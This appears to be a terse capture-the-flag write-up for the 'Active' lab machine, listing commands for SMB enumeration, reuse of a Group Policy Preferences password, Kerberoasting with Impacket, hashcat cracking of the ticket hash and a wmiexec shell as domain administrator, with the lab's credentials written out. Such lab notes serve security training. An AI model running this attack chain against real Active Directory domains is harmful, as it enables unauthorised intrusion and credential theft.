# ACTIVE
--------------------------------------------------------------------
## Topics will be covered
- SMB enumeration techniques
- Group Policy Preferences enumeration and exploitation
- Identification and exploitation of Kerberoastable accounts

##  Enumeration and Exploiting tools:
```bash
    - Nmap
        ○ nmap -Pn -sV -sC  10.10.10.100
    - SMB
        ○ smbclient -L //10.10.10.100
        ○ smbmap -H 10.10.10.100
        ○ smbclient //10.10.10.100/Replication
    - Foothold (First successful breach/Limited access/Starting point)
        ○ Group Policy Preferences
    - Authenticated Enumeration
        ○ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
        ○ smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
    - Privilege Escalation
        ○ ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
        ○ GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
    - Kerberoasting
        ○ ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
        ○ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
        ○ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
    - Cracking of Kerberos TGS Hash 
        ○ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable 
    - Shell as Primary Domain Admin 
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```